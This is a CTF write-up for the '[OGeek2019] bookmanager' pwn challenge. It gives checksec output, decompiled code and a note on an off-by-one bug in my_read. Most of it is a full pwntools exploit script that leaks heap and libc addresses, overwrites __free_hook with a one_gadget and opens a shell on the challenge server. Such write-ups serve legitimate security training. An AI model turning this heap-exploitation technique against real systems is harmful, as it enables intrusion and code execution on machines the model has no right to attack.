# BUU-[OGeek2019]bookmanager

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add_chapter**

```c
int __fastcall Add_chapter(__int64 book)
{
  int v2; // [rsp+18h] [rbp-8h]
  int i; // [rsp+1Ch] [rbp-4h]

  v2 = -1;
  for ( i = 0; i <= 11; ++i )
  {
    if ( !*(_QWORD *)(book + 8 * (i + 4LL)) )
    {
      v2 = i;
      break;
    }
  }
  if ( v2 == -1 )
    return puts("\nNot enough space");
  *(_QWORD *)(book + 8 * (v2 + 4LL)) = malloc(0x80uLL);
  printf("\nChapter name:");
  return my_read(*(void **)(book + 8 * (v2 + 4LL)), 0x20u);
}
```

**add_section**

```c
unsigned __int64 __fastcall Add_section(__int64 a1)
{
  __int64 v1; // rbx
  int i; // [rsp+18h] [rbp-48h]
  int j; // [rsp+1Ch] [rbp-44h]
  char s[40]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v6; // [rsp+48h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  memset(s, 0, 0x20uLL);
  printf("\nWhich chapter do you want to add into:");
  my_read(s, 0x20u);
  for ( i = 0; i <= 11; ++i )
  {
    if ( *(_QWORD *)(a1 + 8 * (i + 4LL)) && !strncmp(s, *(const char **)(a1 + 8 * (i + 4LL)), 0x20uLL) )
    {
      for ( j = 0; j <= 9; ++j )
      {
        if ( !*(_QWORD *)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL)) )
        {
          v1 = *(_QWORD *)(a1 + 8 * (i + 4LL));
          *(_QWORD *)(v1 + 8 * (j + 4LL)) = malloc(0x30uLL);
          printf("0x%p", *(const void **)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL)));
          printf("\nSection name:");
          my_read(*(void **)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL)), 0x20u);
          *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL)) + 40LL) = 0x20;
          return __readfsqword(0x28u) ^ v6;
        }
      }
      printf("\nNot enough space");
    }
  }
  printf("\nChapter not found!");
  return __readfsqword(0x28u) ^ v6;
}
```

**add_text**

```c
unsigned __int64 __fastcall Add_text(__int64 a1)
{
  __int64 v1; // rbx
  size_t v2; // rax
  int v4; // [rsp+14h] [rbp-14Ch]
  int i; // [rsp+18h] [rbp-148h]
  int size; // [rsp+1Ch] [rbp-144h]
  char s2[32]; // [rsp+20h] [rbp-140h] BYREF
  char s[264]; // [rsp+40h] [rbp-120h] BYREF
  unsigned __int64 v9; // [rsp+148h] [rbp-18h]

  v9 = __readfsqword(0x28u);
  printf("\nWhich section do you want to add into:");
  my_read(s2, 0x1Eu);
  v4 = 0;
LABEL_12:
  if ( v4 <= 9 )
  {
    for ( i = 0; ; ++i )
    {
      if ( i > 9 )
      {
        ++v4;
        goto LABEL_12;
      }
      if ( *(_QWORD *)(a1 + 8 * (v4 + 4LL))
        && *(_QWORD *)(*(_QWORD *)(a1 + 8 * (v4 + 4LL)) + 8 * (i + 4LL))
        && !strcmp(*(const char **)(*(_QWORD *)(a1 + 8 * (v4 + 4LL)) + 8 * (i + 4LL)), s2) )
      {
        break;
      }
    }
    printf("\nHow many chapters you want to write:");
    size = ((__int64 (__fastcall *)(const char *))choice)("\nHow many chapters you want to write:");
    if ( size <= 0x100 )
    {
      v1 = *(_QWORD *)(*(_QWORD *)(a1 + 8 * (v4 + 4LL)) + 8 * (i + 4LL));
      *(_QWORD *)(v1 + 32) = malloc(size);
      printf("\nText:");
      my_read(s, 0x100u);
      v2 = strlen(s);
      memcpy(*(void **)(*(_QWORD *)(*(_QWORD *)(a1 + 8 * (v4 + 4LL)) + 8 * (i + 4LL)) + 32LL), s, v2);
    }
    else
    {
      printf("\nToo many");
    }
  }
  else
  {
    printf("\nSection not found!");
  }
  return __readfsqword(0x28u) ^ v9;
}
```

**up**

```c
unsigned __int64 __fastcall Update(__int64 a1)
{
  int i; // [rsp+1Ch] [rbp-124h]
  int v3; // [rsp+20h] [rbp-120h]
  int v4; // [rsp+24h] [rbp-11Ch]
  int v5; // [rsp+28h] [rbp-118h]
  int v6; // [rsp+2Ch] [rbp-114h]
  char s[264]; // [rsp+30h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+138h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  memset(s, 0, 0x100uLL);
  printf("\nWhat to update?(Chapter/Section/Text):");
  my_read(s, 0xFFu);
  if ( !strcmp(s, "Chapter") )
  {
    printf("\nChapter name:");
    my_read(s, 0x20u);
    for ( i = 0; i <= 9; ++i )
    {
      if ( *(_QWORD *)(a1 + 8 * (i + 4LL)) && !strcmp(*(const char **)(a1 + 8 * (i + 4LL)), s) )
      {
        printf("\nNew Chapter name:");
        my_read(*(void **)(a1 + 8 * (i + 4LL)), 0x20u);
        printf("\nUpdated");
        return __readfsqword(0x28u) ^ v8;
      }
    }
    printf("\nNot found!");
LABEL_34:
    printf("\nNothing has been done!");
    return __readfsqword(0x28u) ^ v8;
  }
  if ( !strcmp(s, "Section") )
  {
    printf("\nSection name:");
    my_read(s, 0x20u);
    while ( v3 <= 9 )
    {
      if ( *(_QWORD *)(a1 + 8 * (v3 + 4LL)) )
      {
        while ( v4 <= 9 )
        {
          if ( *(_QWORD *)(*(_QWORD *)(a1 + 8 * (v3 + 4LL)) + 8 * (v4 + 4LL))
            && !strcmp(s, *(const char **)(*(_QWORD *)(a1 + 8 * (v3 + 4LL)) + 8 * (v4 + 4LL))) )
          {
            printf("\nNew Section name:");
            my_read(
              *(void **)(*(_QWORD *)(a1 + 8 * (v3 + 4LL)) + 8 * (v4 + 4LL)),
              *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 8 * (v3 + 4LL)) + 8 * (v4 + 4LL)) + 40LL));
            printf("\nUpdated");
            return __readfsqword(0x28u) ^ v8;
          }
          ++v4;
        }
      }
      ++v3;
    }
    goto LABEL_34;
  }
  if ( !strcmp(s, "Text") )
  {
    printf("\nSection name:");
    my_read(s, 0x20u);
    while ( v5 <= 9 )
    {
      if ( *(_QWORD *)(a1 + 8 * (v5 + 4LL)) )
      {
        while ( v6 <= 9 )
        {
          if ( *(_QWORD *)(*(_QWORD *)(a1 + 8 * (v5 + 4LL)) + 8 * (v6 + 4LL))
            && !strcmp(s, *(const char **)(*(_QWORD *)(a1 + 8 * (v5 + 4LL)) + 8 * (v6 + 4LL))) )
          {
            printf("\nNew Text:");
            my_read(*(void **)(*(_QWORD *)(*(_QWORD *)(a1 + 8 * (v5 + 4LL)) + 8 * (v6 + 4LL)) + 32LL), 0xFFu);
            printf("\nUpdated");
            return __readfsqword(0x28u) ^ v8;
          }
          ++v6;
        }
      }
      ++v5;
    }
    goto LABEL_34;
  }
  printf("\nInvalid!");
  return __readfsqword(0x28u) ^ v8;
}
```

在`my_read`中有`off-by-one`漏洞，根据各个chunk的结构，我们可以在section中，进行`off-by-one`从而修改其text的指针，指向自身，对任意地址进行读写。

## exp

```python
from pwn import *
#from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./pwn'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('node3.buuoj.cn',28010)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.23.so',checksec=False)

def add_chapter(name):
	sh.sendlineafter('choice:','1')
	sh.sendafter('name:',str(name))

def add_section(chaptr_name,name):
	sh.sendlineafter('choice:','2')
	sh.sendlineafter('add into:',str(chaptr_name))
	sh.sendafter('name:',str(name))

def add_text(section_name,size,text):
	sh.sendlineafter('choice:','3')
	sh.sendlineafter('add into:',str(section_name))
	sh.sendlineafter('write:',str(size))
	sh.sendafter('Text',str(text))

def free_chapter(name):
	sh.sendlineafter('choice:','4')
	sh.sendafter('name:',str(name))

def free_section(name):
	sh.sendlineafter('choice:','5')
	sh.sendafter('name:',str(name))

def free_text(name):
	sh.sendlineafter('choice:','6')
	sh.sendafter('name:',str(name))

def show():
	sh.sendlineafter('choice:','7')

def up_chapter(name,content):
	sh.sendlineafter('choice:','8')
	sh.sendlineafter('/Text):','Chapter')
	sh.sendlineafter('name:',str(name))
	sh.sendafter('name:',str(content))

def up_section(name,new):
	sh.sendlineafter('choice:','8')
	sh.sendlineafter('/Text):','Section')
	sh.sendlineafter('name:',str(name))
	sh.sendafter('name:',str(new))

def up_text(name,new):
	sh.sendlineafter('choice:','8')
	sh.sendlineafter('/Text):','Text')
	sh.sendlineafter('name:',str(name))
	sh.sendafter('Text:',str(new))

one=[0x45216,0x4526a,0xf02a4,0xf02a4]
sh.sendline('Niebelungen')
add_chapter('aaaa')

#add_section('aaaa','1111')
sh.sendlineafter('choice:','2')
sh.sendlineafter('add into:','aaaa')
sh.recvuntil('0x0x')
heap_base = int(sh.recvuntil('\n')[:-1],16)-0xa0
leak('heap base',heap_base)
#pause()
sh.sendafter('name:','1111')

add_text('1111',0x100,'a1a1')

add_section('aaaa','2222')
add_text('2222',0x10,'a2a2')

free_text('1111')
add_text('1111',0x100,'\n')

show()
main_arena = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-88
malloc_hook = main_arena-0x10
libcbase = malloc_hook-libc.sym['__malloc_hook']
free_hook = libcbase+libc.sym['__free_hook']
one_gadget=libcbase+one[1]
leak('main arena',main_arena)
leak('libc base',libcbase)

up_section('1'*4,'1'*4+'\x00'*(0x20-4)+'\x50')

up_text('1'*4,p64(free_hook)+p64(0x20))
up_text('1'*4,p64(one_gadget))
#gdb.attach(sh)
free_text('2222')

sh.interactive()
```

